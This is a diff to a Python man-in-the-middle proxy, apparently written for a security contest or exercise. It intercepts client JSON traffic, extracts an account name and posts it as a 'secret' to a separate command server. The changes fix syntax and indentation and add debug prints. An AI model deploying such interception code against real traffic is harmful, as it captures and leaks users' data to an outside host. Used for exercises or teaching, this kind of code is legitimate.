@@ -31,12 +31,15 @@ def mitm(buff, direction):
     hb = buff 
     if direction == CLIENT2SERVER:
         request = json.loads(hb)
-        if request['mode'] != None && request['mode'] == 'new':
+        if request['mode'] != None and request['mode'] == 'new':
             account = request['account'] 
+            print(account)
+            sys.stdout.flush()
             sendLearnedAccountName(account)
             sendDoneRequest()
     elif direction == SERVER2CLIENT:
         pass
+    return hb
     
 @contextmanager
 def ignored(*exceptions):
@@ -91,17 +94,22 @@ def sendLearnedAccountName(account):
     payload ={"type": "learned","variable": "account","secret": account}
     headers = {'Content-type': 'application/json'}
     json_data = json.dumps(payload)
+    print(json_data)
+    print(COMMANDSERVER,COMMANDPORT)
     connection.request('POST', 'REQUEST', json_data, headers)
     response = conn.getresponse()
-
+    conn.close()
+    print('strange')
 
 def sendDoneRequest():
     connection = http.client.HTTPSConnection(COMMANDSERVER,COMMANDPORT,timeout=10)
-    payload = '{\"type\": \"done\"}'
+    payload = {"type": "done"}
     headers = {'Content-type': 'application/json'}
     json_data = json.dumps(payload)
+    print(json_data)
     connection.request('POST', 'REQUEST', json_data, headers)
     response = conn.getresponse()
+    conn.close()
 
 
 def doProxyMain(port, remotehost, remoteport):
@@ -113,14 +121,14 @@ def doProxyMain(port, remotehost, remoteport):
         s.listen(1)
         workers = []
         while running == True:
-        k,a = s.accept()
-        v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        v.connect((remotehost, remoteport))
-        t1 = threading.Thread(target=worker, args=(k,v,CLIENT2SERVER))
-        t2 = threading.Thread(target=serverworker, args=(v,k,SERVER2CLIENT))
-        t2.start()
-        t1.start()
-        workers.append((t1,t2,k,v))
+            k,a = s.accept()
+            v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            v.connect((remotehost, remoteport))
+            t1 = threading.Thread(target=worker, args=(k,v,CLIENT2SERVER))
+            t2 = threading.Thread(target=worker, args=(v,k,SERVER2CLIENT))
+            t2.start()
+            t1.start()
+            workers.append((t1,t2,k,v))
     except KeyboardInterrupt:
         signalhandler(None, None)
     for t1,t2,k,v in workers:
